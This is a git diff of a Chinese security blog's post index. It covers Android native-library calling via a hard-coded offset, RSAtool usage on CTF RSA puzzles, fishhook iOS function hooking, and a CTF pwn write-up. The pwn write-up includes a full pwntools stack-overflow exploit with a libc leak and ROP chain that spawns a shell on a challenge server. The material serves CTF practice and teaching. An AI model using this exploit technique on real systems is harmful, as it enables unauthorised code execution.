+<h2 id="编写调用so"><a href="#编写调用so" class="headerlink" title="编写调用so"></a>编写调用so</h2><p>本方案主要是通过自己编写的so调用native函数所在的so，自己的so名为hookso<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">			<span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">			setContentView(R.layout.activity_main);</div><div class="line">			</div><div class="line">			System.loadLibrary(<span class="string">"hookso"</span>);</div><div class="line">			</div><div class="line">			<span class="keyword">float</span> value =TypedValue.complexToFloat(<span class="number">55297</span>);</div><div class="line">			Log.e(<span class="string">"DEBUG"</span>, <span class="string">": "</span> + value);</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> </span>&#123;</div><div class="line">			<span class="comment">// Inflate the menu; this adds items to the action bar if it is present.</span></div><div class="line">			getMenuInflater().inflate(R.menu.main, menu);</div><div class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">		&#125;</div><div class="line">	</div><div class="line">		<span class="meta">@Override</span></div><div class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</div><div class="line">			<span class="comment">// Handle action bar item clicks here. The action bar will</span></div><div class="line">			<span class="comment">// automatically handle clicks on the Home/Up button, so long</span></div><div class="line">			<span class="comment">// as you specify a parent activity in AndroidManifest.xml.</span></div><div class="line">			<span class="keyword">int</span> id = item.getItemId();</div><div class="line">			<span class="keyword">if</span> (id == R.id.action_settings) &#123;</div><div class="line">				JNI.testfunc();</div><div class="line">				<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNI</span></span></div><div class="line">&#123;</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">testfunc</span><span class="params">()</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="jni配置-1"><a href="#jni配置-1" class="headerlink" title="jni配置"></a>jni配置</h2><h3 id="Android-mk-1"><a href="#Android-mk-1" class="headerlink" title="Android.mk"></a>Android.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"></div><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE    := hookso</div><div class="line">LOCAL_SRC_FILES := hookso.cpp</div><div class="line"></div><div class="line">LOCAL_LDLIBS += -llog  #<span class="built_in">log</span></div><div class="line"></div><div class="line">include $(BUILD_SHARED_LIBRARY)</div></pre></td></tr></table></figure>
+<h3 id="Application-mk-1"><a href="#Application-mk-1" class="headerlink" title="Application.mk"></a>Application.mk</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line">APP_ABI := armeabi-v7a</div><div class="line">APP_STL := c++<span class="number">_</span>shared</div><div class="line">APP_CPPFLAGS := -fexceptions -frtti</div></pre></td></tr></table></figure>
+<h3 id="hookso-cpp"><a href="#hookso-cpp" class="headerlink" title="hookso.cpp"></a>hookso.cpp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/un.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">u_int32_t</span> <span class="params">(*<span class="keyword">common_func_t</span>)</span><span class="params">(<span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>, <span class="keyword">u_int32_t</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_TAG <span class="meta-string">"DEBUG"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(lvl, fmt, args...) __android_log_print(lvl, \</span></div><div class="line">		LOG_TAG, fmt, ##args)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">get_module_base</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name)</span></span></div><div class="line">&#123;</div><div class="line">    FILE* fp;</div><div class="line">    <span class="keyword">long</span> addr = <span class="number">0</span>;</div><div class="line">    <span class="keyword">char</span> *pch;</div><div class="line">    <span class="keyword">char</span> filename[<span class="number">32</span>];</div><div class="line">    <span class="keyword">char</span> line[<span class="number">1024</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(pid &lt;= <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/self/maps"</span>);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/%d/maps"</span>, pid);</div><div class="line">    &#125;</div><div class="line">    fp = fopen(filename,<span class="string">"r"</span>);</div><div class="line">    <span class="keyword">if</span>(fp != <span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">while</span>(fgets(line, <span class="keyword">sizeof</span>(line), fp))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(<span class="built_in">strstr</span>(line, module_name))</div><div class="line">            &#123;</div><div class="line">                pch = strtok(line, <span class="string">"-"</span>);</div><div class="line">                addr = strtoul(pch, <span class="literal">NULL</span>, <span class="number">16</span>);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        fclose(fp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*)addr;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Java_com_example_hookso_JNI_testfunc</span><span class="params">(JNIEnv *env, jobject jobj)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Java_com_example_hookso_JNI_testfunc</span><span class="params">(JNIEnv *env, jobject jobj)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">string</span> str = <span class="string">"1"</span>;</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"Java_com_example_hookso_JNI_testfunc: %s\n"</span>, str.c_str());</div><div class="line">	<span class="keyword">void</span> *cs_handle = dlopen(<span class="string">"/data/local/tmp/native.so"</span>, RTLD_NOW);</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"[+] dlerror : %s"</span>, dlerror());</div><div class="line">	LOGD(ANDROID_LOG_WARN, <span class="string">"[+] cs_handle: %p"</span>, cs_handle);</div><div class="line"><span class="comment">//导出用下面这一句</span></div><div class="line"><span class="comment">//	void *cs_open_func = dlsym(cs_handle, "导出函数name");</span></div><div class="line"></div><div class="line">	<span class="keyword">u_int32_t</span> addr1 = (<span class="keyword">u_int32_t</span>)get_module_base(<span class="number">0</span>, <span class="string">"ntiave.so"</span>);</div><div class="line">	<span class="comment">//arm指令不加1 0，thumb指令加1 1</span></div><div class="line">	addr1 += <span class="number">0x0000ABD4</span>;</div><div class="line">	<span class="keyword">common_func_t</span> func = (<span class="keyword">common_func_t</span>)addr1;</div><div class="line"></div><div class="line">	jstring key = env-&gt;NewStringUTF(<span class="string">"1"</span>);</div><div class="line"><span class="comment">//	jstring str = env-&gt;NewStringUTF("qazwsxedcrfvtgbh64as65d465wq6d54a6s54d98aw4d65a4sd64qw6f46a4s9fd8d");</span></div><div class="line"></div><div class="line">	jstring ret1 = (jstring)func((<span class="keyword">u_int32_t</span>)env, <span class="number">0</span>, (<span class="keyword">u_int32_t</span>)key, <span class="number">0</span>);</div><div class="line"><span class="comment">//	jstring ret1 = (jstring)func((u_int32_t)env, 0, 0, 0);</span></div><div class="line"></div><div class="line">	LOGD(ANDROID_LOG_DEBUG, <span class="string">"[+] test_jstr: %s, size: %d"</span>, env-&gt;GetStringUTFChars((jstring)ret1, <span class="literal">false</span>), env-&gt;GetStringUTFLength((jstring)ret1));</div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
 ]]></content>
       <tags>
-        <tag>iOS</tag>
-        <tag>MachO</tag>
-        <tag>Tweak</tag>
+        <tag>Android</tag>
+        <tag>Tools</tag>
+        <tag>eclipse</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RSAtool使用方法</title>
+    <url>/2016/08/19/RSAtools%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<p>最近在做CTF的时候遇到几道RSA的解密题目，网上介绍了RSAtool这款工具，在网上找了一部分资料，也没有相关的使用方法，自己总结了一下，写下来和大家一起分享。<br><a id="more"></a><br>RSAtool是一个非常方便实用的小工具，可以用来计算RSA中的几个参数、生成密钥、加解密，一些不太复杂的破解工作也可以用它。</p>
+<p>这里就不在RSA算法上多做研究了，直接通过两个CTF例子直观体现吧。</p>
+<h2 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h2><pre><code>还记得veryeasy RSA吗？是不是不难？那继续来看看这题吧，这题也不难。
+已知一段RSA加密的信息为：0xdc2eeeb2782c且已知加密所用的公钥：
+(N=322831561921859 e = 23)
+请解密出明文，提交时请将数字转化为ascii码提交
+比如你解出的明文是0x6162，那么请提交字符串ab
+提交格式:PCTF{明文字符串}
+</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools4.png" alt=""></p>
+<p>图中的P、Q、R、D、E分别就是RSA算法中的p、q、N、d、e，右上角选择进制，注意不要弄错，e只有十六进制可用，所以这里要把23换成17。</p>
+<p>将N=322831561921859填入，左下角有一个Factor N的按钮，这是分解N的意思，点一下，会自动开始分解因数，得到P=13574881、Q=23781539，再点一下Calc. D，计算出d=42108459725927，这时可以看到Test按钮不再是灰色，表明可以使用简单的加解密功能，点它，弹出一个框。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools3.png" alt=""></p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools2.png" alt=""></p>
+<p>第一个框是明文，第二个框是密文，输入明文123456，点击Encrypt，得到密文1464305227134，这时就可以使用解密功能（好像必须先用一次加密才行）。</p>
+<p>密文0xdc2eeeb2782c，换算十进制242094131279916，点Decrypt，直接得到字符串3a5Y。</p>
+<h2 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h2><pre><code>已知RSA公钥生成参数：
+p = 3487583947589437589237958723892346254777 
+q = 8767867843568934765983476584376578389
+e = 65537
+求d = 
+请提交PCTF{d}
+</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools1.png" alt=""></p>
+<p>直接将p，q填入，将e的值65537转换成10进制10001，之后计算d的值就可以了。</p>
+]]></content>
+      <tags>
+        <tag>密码学</tag>
+        <tag>工具</tag>
+        <tag>writeup</tag>
       </tags>
   </entry>
   <entry>
@@ -156,39 +192,6 @@ Preferenceloader，applist模块集成
       <tags>
         <tag>iOS</tag>
         <tag>MachO</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RSAtool使用方法</title>
-    <url>/2016/08/19/RSAtools%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<p>最近在做CTF的时候遇到几道RSA的解密题目，网上介绍了RSAtool这款工具，在网上找了一部分资料，也没有相关的使用方法，自己总结了一下，写下来和大家一起分享。<br><a id="more"></a><br>RSAtool是一个非常方便实用的小工具，可以用来计算RSA中的几个参数、生成密钥、加解密，一些不太复杂的破解工作也可以用它。</p>
-<p>这里就不在RSA算法上多做研究了，直接通过两个CTF例子直观体现吧。</p>
-<h2 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h2><pre><code>还记得veryeasy RSA吗？是不是不难？那继续来看看这题吧，这题也不难。
-已知一段RSA加密的信息为：0xdc2eeeb2782c且已知加密所用的公钥：
-(N=322831561921859 e = 23)
-请解密出明文，提交时请将数字转化为ascii码提交
-比如你解出的明文是0x6162，那么请提交字符串ab
-提交格式:PCTF{明文字符串}
-</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools4.png" alt=""></p>
-<p>图中的P、Q、R、D、E分别就是RSA算法中的p、q、N、d、e，右上角选择进制，注意不要弄错，e只有十六进制可用，所以这里要把23换成17。</p>
-<p>将N=322831561921859填入，左下角有一个Factor N的按钮，这是分解N的意思，点一下，会自动开始分解因数，得到P=13574881、Q=23781539，再点一下Calc. D，计算出d=42108459725927，这时可以看到Test按钮不再是灰色，表明可以使用简单的加解密功能，点它，弹出一个框。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools3.png" alt=""></p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools2.png" alt=""></p>
-<p>第一个框是明文，第二个框是密文，输入明文123456，点击Encrypt，得到密文1464305227134，这时就可以使用解密功能（好像必须先用一次加密才行）。</p>
-<p>密文0xdc2eeeb2782c，换算十进制242094131279916，点Decrypt，直接得到字符串3a5Y。</p>
-<h2 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h2><pre><code>已知RSA公钥生成参数：
-p = 3487583947589437589237958723892346254777 
-q = 8767867843568934765983476584376578389
-e = 65537
-求d = 
-请提交PCTF{d}
-</code></pre><p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/RSAtools1.png" alt=""></p>
-<p>直接将p，q填入，将e的值65537转换成10进制10001，之后计算d的值就可以了。</p>
-]]></content>
-      <tags>
-        <tag>密码学</tag>
-        <tag>工具</tag>
-        <tag>writeup</tag>
       </tags>
   </entry>
   <entry>
@@ -393,6 +396,53 @@ p.interactive()
       </tags>
   </entry>
   <entry>
+    <title>XMAN-level4</title>
+    <url>/2017/02/28/XMAN-level4/</url>
+    <content><![CDATA[<p>本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。<br><a id="more"></a><br>有一个地方需要注意，leak函数可以在write之后直接pop三个参数再返回main：</p>
+<pre><code>payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
+</code></pre><p>也可以重新返回vuln：</p>
+<pre><code>payload+=p32(write_plt)+p32(vlun)+p32(1)+p32(address)+p32(4)
+</code></pre><p>脚本如下：</p>
+<pre><code>from pwn import *
+
+#p=process(&apos;./level4&apos;)
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9880)
+level4=ELF(&apos;./level4&apos;)
+
+#plt
+write_plt=0x08048340
+read_plt=0x08048310
+
+#addr
+main=level4.symbols[&apos;main&apos;]
+basebss=level4.bss()
+pppr=0x08048509
+
+def leak(address):
+        payload=&apos;A&apos;*140
+    payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
+        p.send(payload)
+        data =p.recv(4)
+    print &quot;%#x %s&quot; % (address, data)
+        return data
+
+
+d = DynELF(leak, elf=ELF(&apos;./level4&apos;))
+
+system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)
+log.success(&apos;leak system address: &apos; + hex(system_addr))
+
+payload2=&apos;A&apos;*140+p32(read_plt)+p32(pppr)+p32(0)+p32(basebss)+p32(8)+p32(system_addr)+p32(main)+p32(basebss)
+p.send(payload2)
+p.send(&apos;/bin/sh\x00&apos;)
+p.interactive()
+</code></pre>]]></content>
+      <tags>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XMAN-Level3-x64</title>
     <url>/2017/02/27/XMAN-Level3-x64/</url>
     <content><![CDATA[<p>这个题目和XMAN-Level2-x64考察目的是一样的，都是考察在x64中传参数的问题，这个题目是如何考察在x64中传多个参数。<br><a id="more"></a></p>
@@ -439,53 +489,6 @@ payload += p64(systemaddr)
 sh.send(payload)
 sh.send(&apos;/bin/sh\x00&apos;)
 sh.interactive()
-</code></pre>]]></content>
-      <tags>
-        <tag>ctf</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XMAN-level4</title>
-    <url>/2017/02/28/XMAN-level4/</url>
-    <content><![CDATA[<p>本题其实就是level3的一个升级版本，唯一的区别就是本题没有提供libc，可以通过DynELF泄漏函数真实地址。<br><a id="more"></a><br>有一个地方需要注意，leak函数可以在write之后直接pop三个参数再返回main：</p>
-<pre><code>payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
-</code></pre><p>也可以重新返回vuln：</p>
-<pre><code>payload+=p32(write_plt)+p32(vlun)+p32(1)+p32(address)+p32(4)
-</code></pre><p>脚本如下：</p>
-<pre><code>from pwn import *
-
-#p=process(&apos;./level4&apos;)
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9880)
-level4=ELF(&apos;./level4&apos;)
-
-#plt
-write_plt=0x08048340
-read_plt=0x08048310
-
-#addr
-main=level4.symbols[&apos;main&apos;]
-basebss=level4.bss()
-pppr=0x08048509
-
-def leak(address):
-        payload=&apos;A&apos;*140
-    payload+=p32(write_plt)+p32(pppr)+p32(1)+p32(address)+p32(4)+p32(main)
-        p.send(payload)
-        data =p.recv(4)
-    print &quot;%#x %s&quot; % (address, data)
-        return data
-
-
-d = DynELF(leak, elf=ELF(&apos;./level4&apos;))
-
-system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)
-log.success(&apos;leak system address: &apos; + hex(system_addr))
-
-payload2=&apos;A&apos;*140+p32(read_plt)+p32(pppr)+p32(0)+p32(basebss)+p32(8)+p32(system_addr)+p32(main)+p32(basebss)
-p.send(payload2)
-p.send(&apos;/bin/sh\x00&apos;)
-p.interactive()
 </code></pre>]]></content>
       <tags>
         <tag>ctf</tag>
@@ -612,6 +615,76 @@ gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数�
       </tags>
   </entry>
   <entry>
+    <title>fishhook原理探究</title>
+    <url>/2020/12/23/fishhook%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/</url>
+    <content><![CDATA[<p>上一篇整理了一下MachO文件的基本结构，但是对其主要的工作原理并没有深究，fishhook是iOS安全中常见的hook框架，可以通过对其原理探究更加深入的了解MachO的工作原理。<br><a id="more"></a></p>
+<h1 id="fishhook"><a href="#fishhook" class="headerlink" title="fishhook"></a>fishhook</h1><p>fishHook是Facebook提供的一个动态修改链接mach-O文件的工具。利用MachO文件加载原理，通过修改懒加载表(Lazy Symbol Pointers)和非懒加载表(Non-Lazy Symbol Pointers)这两个表的指针达到C函数HOOK的目的。</p>
+<p>首先需要下载fishhook<a href="https://github.com/facebook/fishhookw" target="_blank" rel="external">源码</a>，新建项目，将其中的fishhook.c和fishhook.h文件放入目录下：</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook1.jpg" alt=""></p>
+<h2 id="fishhook简单利用"><a href="#fishhook简单利用" class="headerlink" title="fishhook简单利用"></a>fishhook简单利用</h2><p>fishhook.h内容并不多，只有两个接口函数和一个结构体，具体如下:</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> fishhook_h</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> fishhook_h</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> !defined(FISHHOOK_EXPORT)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FISHHOOK_VISIBILITY __attribute__((visibility(<span class="meta-string">"hidden"</span>)))</span></div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FISHHOOK_VISIBILITY __attribute__((visibility(<span class="meta-string">"default"</span>)))</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//__cplusplus</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> rebinding &#123;</div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *name; <span class="comment">//需要HOOK的函数名称，字符串</span></div><div class="line">  <span class="keyword">void</span> *replacement; <span class="comment">//替换到哪个新的函数上(新函数地址)</span></div><div class="line">  <span class="keyword">void</span> **replaced; <span class="comment">//保存原始函数指针变量的指针</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function">FISHHOOK_VISIBILITY</span></div><div class="line"><span class="keyword">int</span> <span class="title">rebind_symbols</span><span class="params">(<span class="keyword">struct</span> rebinding rebindings[], <span class="keyword">size_t</span> rebindings_nel)</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function">FISHHOOK_VISIBILITY</span></div><div class="line"><span class="keyword">int</span> <span class="title">rebind_symbols_image</span><span class="params">(<span class="keyword">void</span> *header,</span></div><div class="line">                         <span class="keyword">intptr_t</span> slide,</div><div class="line">                         <span class="keyword">struct</span> rebinding rebindings[],</div><div class="line">                         <span class="keyword">size_t</span> rebindings_nel);</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></div><div class="line">&#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//__cplusplus</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//fishhook_h</span></span></div></pre></td></tr></table></figure>
+<p>rebind_symbols函数的第一个参数传入rebinding结构体数组，hook一个函数只需要传入一个rebinding结构体，hook多个函数则传入多个rebinding结构体。</p>
+<p>rebinding结构体参数意义如下：<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="keyword">struct</span> rebinding &#123;</div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *name; <span class="comment">//需要HOOK的函数名称，字符串</span></div><div class="line">  <span class="keyword">void</span> *replacement; <span class="comment">//替换到哪个新的函数上(新函数地址)</span></div><div class="line">  <span class="keyword">void</span> **replaced; <span class="comment">//保存原始函数指针变量的指针</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p>demo的代码如下：<br><figure class="highlight"><table><tr><td class="code"><pre><div class="line">#import "ViewController.h"</div><div class="line">#import "fishhook.h"</div><div class="line"></div><div class="line">@interface ViewController ()</div><div class="line"></div><div class="line">@end</div><div class="line"></div><div class="line">@implementation ViewController</div><div class="line">    </div><div class="line">    </div><div class="line"></div><div class="line">- (void)viewDidLoad &#123;</div><div class="line">    [super viewDidLoad];</div><div class="line">    //定义rebingding结构体</div><div class="line">    struct rebinding nslogBind;</div><div class="line">    //函数名称</div><div class="line">    nslogBind.name = "NSLog";</div><div class="line">    //新函数地址</div><div class="line">    nslogBind.replacement = myNSLog;</div><div class="line">    //保存原始函数地址的变量的指针</div><div class="line">    nslogBind.replaced = (void *)&amp;old_nslog;</div><div class="line">    </div><div class="line">    //数组</div><div class="line">    struct rebinding rebs[] = &#123;nslogBind&#125;;</div><div class="line">  </div><div class="line">    rebind_symbols(rebs, 1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">//函数指针，用来保存原始的函数的地址</div><div class="line">static void(*old_nslog)(NSString *format, ...);</div><div class="line"></div><div class="line">//新的NSLog</div><div class="line">void myNSLog(NSString *format, ...)&#123;</div><div class="line">    format = @"~~勾上了！\n";</div><div class="line">    //再调用原来的nslog</div><div class="line">    old_nslog(format);</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (void)touchesBegan:(NSSet&lt;UITouch *&gt; *)touches withEvent:(UIEvent *)event&#123;</div><div class="line">    NSLog(@"点击了屏幕");</div><div class="line">&#125;</div><div class="line"></div><div class="line">@end</div></pre></td></tr></table></figure></p>
+<p>运行点击屏幕，就可以Hook NSLog函数输出我们自己定义的字符串。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook2.jpg" alt=""></p>
+<h2 id="fishhook原理分析"><a href="#fishhook原理分析" class="headerlink" title="fishhook原理分析"></a>fishhook原理分析</h2><p>首先有个问题需要思考，fishhook为什么可以Hook系统的C函数，只有动态才有可能被Hook，C函数是静态的，OC是动态的，这是因为系统的C函数有动态的部分，也就是符号绑定的过程。</p>
+<p>PIC技术（位置代码独立）：在文件内部生成一个表， 函数名称：函数地址，这玩意就是符号表<br>当MachO由dyld加载到内存中时，在调用NSLOg时，dyld将该函数地址赋值到符号表函数地址，这个过程就叫做符号绑定。</p>
+<p>我们在之前的代码基础上添加两句NSLog输出</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook3.jpg" alt=""></p>
+<p>前面的NSLog是为了提前将该函数进行绑定，也即时懒加载符号表中，非懒加载符号在dyld加载时就会绑定真实的地址值，而懒加载不会，只有第一次去调用才会绑定真实地址，在第二次调用时直接使用真实地址。</p>
+<p>编译demo，使用MachOView查看编译生成的MachO文件，可以看到NSLog是位于懒加载符号表的第一个，offset为0x8020，这里说一下为什么要在最上面的代码写一个NSLog,是为了先完成绑定真实地址的过程，下次调用就不用再去绑定了。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook4.jpg" alt=""></p>
+<p>在rebind_symbols调用处下断点，调试输入命令image list查看demo运行时的基址。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook5.jpg" alt=""></p>
+<p>用获取到的基址加上NSLog函数偏移0x8020，memory read查看内存，查看对应内存地址的汇编代码dis -s，发现是NSLog的函数真实地址</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/fishhook6.jpg" alt=""></p>
